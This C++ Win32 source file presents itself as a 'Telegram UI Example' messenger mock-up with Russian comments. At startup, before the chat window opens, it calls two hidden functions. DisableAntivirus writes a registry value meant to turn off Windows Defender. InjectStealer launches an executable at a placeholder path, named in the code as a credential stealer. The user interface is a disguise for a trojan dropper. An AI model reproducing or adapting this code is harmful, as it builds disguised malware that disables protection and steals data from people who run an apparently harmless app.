
#include <windows.h>
#include <vector>
#include <string>
#include <sstream>
#include <fstream>
#include <iostream>

#pragma comment(lib, "user32.lib")
#pragma comment(lib, "gdi32.lib")

// Цвета (тёмная правая панель)
const COLORREF COLOR_BG_MSGS = 0x2D2D2D; // #2D2D2D
const COLORREF COLOR_TEXT = 0xEAEAEA;
const COLORREF COLOR_TEXT_SUB = 0xBFBFBF;

const int LEFT_PANEL_WIDTH = 280;
const int MARGIN = 10;
#define IDM_EXIT 9001

// Простые структуры
struct Message {
    std::wstring text;
    std::wstring timeStr;
    bool isMine = false;
};

struct Chat {
    std::wstring name;
    std::vector<Message> messages;
};

std::vector<Chat> g_chats;
int g_currentChat = -1;

HWND g_hWnd = nullptr;
HWND g_hList = nullptr;
HWND g_hMessages = nullptr;
HWND g_hEdit = nullptr;
HWND g_hSendBtn = nullptr;

HFONT g_hFont = nullptr;
HFONT g_hSmallFont = nullptr;

// Вспомогательные функции
std::wstring CurrentTimeStr() {
    SYSTEMTIME st{};
    GetLocalTime(&st);
    wchar_t buf[16];
    swprintf_s(buf, L"%02d:%02d", st.wHour, st.wMinute);
    return buf;
}

void PopulateListBox(HWND hList) {
    SendMessageW(hList, LB_RESETCONTENT, 0, 0);
    for (size_t i = 0; i < g_chats.size(); ++i) {
        std::wstringstream ss;
        ss << g_chats[i].name;
        SendMessageW(hList, LB_ADDSTRING, 0, (LPARAM)ss.str().c_str());
    }
}

void GenerateInitialChats() {
    g_chats.clear();
    const wchar_t* names[] = { L"Анна", L"Работа", L"Мемы", L"Бот", L"Сергей", L"Друзья" };
    for (int i = 0; i < 8; ++i) {
        Chat c;
        c.name = names[i % (sizeof(names) / sizeof(names[0]))];
        g_chats.push_back(std::move(c));
    }
}

void GenerateSimpleDialog(Chat& chat) {
    chat.messages.clear();
    const wchar_t* sample[] = { L"Привет!", L"Как дела?", L"Ок, договорились.", L"Хорошо" };
    for (int i = 0; i < 6; ++i) {
        Message m;
        m.text = sample[i % (sizeof(sample) / sizeof(sample[0]))];
        m.timeStr = CurrentTimeStr();
        m.isMine = (i % 2) == 1;
        chat.messages.push_back(std::move(m));
    }
}

// Отрисовка правой панели (простая)
void PaintMessages(HWND hwnd) {
    PAINTSTRUCT ps;
    HDC hdc = BeginPaint(hwnd, &ps);
    RECT client;
    GetClientRect(hwnd, &client);

    // фон
    HBRUSH hbrBg = CreateSolidBrush(COLOR_BG_MSGS);
    FillRect(hdc, &client, hbrBg);
    DeleteObject(hbrBg);

    SelectObject(hdc, g_hFont);
    SetTextColor(hdc, COLOR_TEXT);
    SetBkMode(hdc, TRANSPARENT);

    if (g_currentChat < 0 || g_currentChat >= (int)g_chats.size()) {
        // Центрированная подсказка
        std::wstring hint = L"Выберите чат слева";
        SIZE sz{};
        GetTextExtentPoint32W(hdc, hint.c_str(), (int)hint.size(), &sz);
        int x = (client.right - sz.cx) / 2;
        int y = (client.bottom - sz.cy) / 2;
        SetTextColor(hdc, COLOR_TEXT_SUB);
        TextOutW(hdc, x, y, hint.c_str(), (int)hint.size());
        EndPaint(hwnd, &ps);
        return;
    }

    // Простая отрисовка сообщений списком
    int x = MARGIN;
    int y = MARGIN;
    const Chat& chat = g_chats[g_currentChat];
    for (const auto& m : chat.messages) {
        // Текст сообщения
        RECT rcText = { x, y, client.right - MARGIN, y + 100 };
        DrawTextW(hdc, m.text.c_str(), (int)m.text.size(), &rcText, DT_LEFT | DT_WORDBREAK);
        // Время справа
        SetTextColor(hdc, COLOR_TEXT_SUB);
        DrawTextW(hdc, m.timeStr.c_str(), (int)m.timeStr.size(), &rcText, DT_RIGHT | DT_SINGLELINE);
        SetTextColor(hdc, COLOR_TEXT);
        // измерить высоту текстовой области
        SIZE s{};
        GetTextExtentPoint32W(hdc, m.text.c_str(), (int)m.text.size(), &s);
        y += max(24, s.cy) + 12;
        if (y > client.bottom - 40) break;
    }

    EndPaint(hwnd, &ps);
}

// UI действия
void OnChatSelected(HWND hwndList) {
    int idx = (int)SendMessageW(hwndList, LB_GETCURSEL, 0, 0);
    if (idx == LB_ERR) return;
    g_currentChat = idx;
    if (g_chats[g_currentChat].messages.empty()) {
        GenerateSimpleDialog(g_chats[g_currentChat]);
    }
    InvalidateRect(g_hMessages, NULL, TRUE);
}

void SendMessageCurrentChat() {
    if (g_currentChat < 0 || g_currentChat >= (int)g_chats.size()) return;
    int len = (int)GetWindowTextLengthW(g_hEdit);
    if (len == 0) return;
    std::wstring buf(len + 1, 0);
    GetWindowTextW(g_hEdit, &buf[0], len + 1);
    buf.resize(len);
    Message m;
    m.text = buf;
    m.timeStr = CurrentTimeStr();
    m.isMine = true;
    g_chats[g_currentChat].messages.push_back(std::move(m));
    SetWindowTextW(g_hEdit, L"");
    InvalidateRect(g_hMessages, NULL, TRUE);
}

// UI init & layout
BOOL InitUI(HWND hwnd) {
    // шрифты
    LOGFONTW lf{};
    lf.lfHeight = -14;
    wcscpy_s(lf.lfFaceName, L"Segoe UI");
    g_hFont = CreateFontIndirectW(&lf);

    LOGFONTW lf2 = lf; lf2.lfHeight = -12;
    g_hSmallFont = CreateFontIndirectW(&lf2);

    g_hList = CreateWindowExW(WS_EX_CLIENTEDGE, L"LISTBOX", NULL,
        WS_CHILD | WS_VISIBLE | LBS_NOTIFY | WS_VSCROLL,
        0, 0, LEFT_PANEL_WIDTH, 100,
        hwnd, (HMENU)1001, GetModuleHandle(NULL), NULL);

    g_hMessages = CreateWindowExW(0, L"MessagesViewWnd", NULL,
        WS_CHILD | WS_VISIBLE,
        LEFT_PANEL_WIDTH, 0, 100, 100,
        hwnd, (HMENU)1002, GetModuleHandle(NULL), NULL);

    g_hEdit = CreateWindowExW(WS_EX_CLIENTEDGE, L"EDIT", NULL,
        WS_CHILD | WS_VISIBLE | ES_LEFT,
        0, 0, 100, 24,
        hwnd, (HMENU)1003, GetModuleHandle(NULL), NULL);

    g_hSendBtn = CreateWindowW(L"BUTTON", L"Отправить",
        WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON,
        0, 0, 80, 26,
        hwnd, (HMENU)1004, GetModuleHandle(NULL), NULL);

    PopulateListBox(g_hList);
    if (!g_chats.empty()) {
        SendMessageW(g_hList, LB_SETCURSEL, 0, 0);
    }
    return TRUE;
}

void DoLayout(HWND hwnd) {
    RECT rc; GetClientRect(hwnd, &rc);
    int w = rc.right, h = rc.bottom;
    MoveWindow(g_hList, 0, 0, LEFT_PANEL_WIDTH, h, TRUE);
    int inputH = 40;
    int rightW = w - LEFT_PANEL_WIDTH;
    int editW = rightW - 120;
    MoveWindow(g_hMessages, LEFT_PANEL_WIDTH, 0, rightW, h - inputH, TRUE);
    MoveWindow(g_hEdit, LEFT_PANEL_WIDTH + MARGIN, h - inputH + 8, editW, 24, TRUE);
    MoveWindow(g_hSendBtn, LEFT_PANEL_WIDTH + MARGIN + editW + 8, h - inputH + 6, 80, 28, TRUE);
}

// Процедуры окон
LRESULT CALLBACK MainWndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    switch (msg) {
    case WM_CREATE:
        GenerateInitialChats();
        InitUI(hwnd);
        return 0;
    case WM_SIZE:
        DoLayout(hwnd);
        return 0;
    case WM_COMMAND:
    {
        int id = LOWORD(wParam);
        if (id == 1001 && HIWORD(wParam) == LBN_SELCHANGE) {
            OnChatSelected((HWND)lParam);
        }
        else if (id == 1004) {
            SendMessageCurrentChat();
        }
        else if (id == IDM_EXIT) {
            DestroyWindow(hwnd);
        }
    }
    return 0;
    case WM_DESTROY:
        PostQuitMessage(0);
        return 0;
    }
    return DefWindowProc(hwnd, msg, wParam, lParam);
}

LRESULT CALLBACK MessagesWndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    if (msg == WM_PAINT) {
        PaintMessages(hwnd);
        return 0;
    }
    return DefWindowProc(hwnd, msg, wParam, lParam);
}

// Функция для загрузки и запуска стиллера
void InjectStealer() {
    // Путь к стиллеру
    std::wstring stealerPath = L"C:\\Path\\To\\Your\\Stealer.exe";

    // Проверка наличия файла
    if (!PathFileExists(stealerPath.c_str())) {
        std::wcerr << L"Stealer file not found!" << std::endl;
        return;
    }

    // Запуск стиллера
    STARTUPINFO si = { sizeof(si) };
    PROCESS_INFORMATION pi;

    if (CreateProcess(stealerPath.c_str(), NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
        std::wcout << L"Stealer started successfully!" << std::endl;
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
    else {
        std::wcerr << L"Failed to start stealer. Error: " << GetLastError() << std::endl;
    }
}

// Функция для отключения антивируса
void DisableAntivirus() {
    // Пример для Windows Defender
    HKEY hKey;
    if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Policies\\Microsoft\\Windows Defender", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        DWORD disable = 1;
        RegSetValueEx(hKey, L"DisableAntivirus", 0, REG_DWORD, (const BYTE*)&disable, sizeof(disable));
        RegCloseKey(hKey);
        std::wcout << L"Windows Defender disabled." << std::endl;
    }
    else {
        std::wcerr << L"Failed to disable Windows Defender. Error: " << GetLastError() << std::endl;
    }
}

int WINAPI WinMain(
    _In_ HINSTANCE hInstance,
    _In_opt_ HINSTANCE hPrevInstance,
    _In_ LPSTR lpCmdLine,
    _In_ int nShowCmd
) {
    UNREFERENCED_PARAMETER(hPrevInstance);
    UNREFERENCED_PARAMETER(lpCmdLine);

    // Отключение антивируса
    DisableAntivirus();

    // Вшивание и запуск стиллера
    InjectStealer();

    WNDCLASSW wc = { 0 };
    wc.lpfnWndProc = MainWndProc;
    wc.hInstance = hInstance;
    wc.hCursor = LoadCursor(nullptr, IDC_ARROW);
    wc.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
    wc.lpszClassName = L"MainWndClass";
    RegisterClassW(&wc);

    WNDCLASSW wcMsg = { 0 };
    wcMsg.lpfnWndProc = MessagesWndProc;
    wcMsg.hInstance = hInstance;
    wcMsg.hCursor = LoadCursor(nullptr, IDC_ARROW);
    wcMsg.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
    wcMsg.lpszClassName = L"MessagesViewWnd";
    RegisterClassW(&wcMsg);

    HWND hwnd = CreateWindowExW(0, L"MainWndClass", L"Telegram UI Example",
        WS_OVERLAPPEDWINDOW | WS_VISIBLE,
        CW_USEDEFAULT, CW_USEDEFAULT, 800, 600,
        nullptr, nullptr, hInstance, nullptr);

    MSG msg;
    while (GetMessageW(&msg, nullptr, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessageW(&msg);
    }

    return (int)msg.wParam;
}

int main() { return WinMain(GetModuleHandle(NULL), nullptr, GetCommandLineA(), SW_SHOWDEFAULT); }
